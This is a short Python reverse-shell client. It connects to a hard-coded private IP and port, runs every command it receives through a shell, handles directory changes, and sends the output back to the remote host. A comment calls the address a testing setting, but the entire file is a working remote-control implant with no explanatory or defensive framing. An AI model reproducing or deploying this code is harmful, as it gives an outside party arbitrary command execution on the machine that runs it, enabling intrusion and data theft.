import socket
import os
import subprocess


s = socket.socket()
host, port = '192.168.66.128', 9999
# server address for testing change to local ip

s.connect((host, port))

while True:
    data = s.recv(1024).decode('utf-8')
    if len(data) > 0:
        if data[:2] == 'cd':
            os.chdir(data[3:])
            output_byte = str(os.getcwd()+"> ").encode()
        else:
            cmd = subprocess.Popen(data.split(' '), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            # print(output_byte.decode('utf-8')) #this line must be uncommented if u want to show the output on client window

        s.send(output_byte)


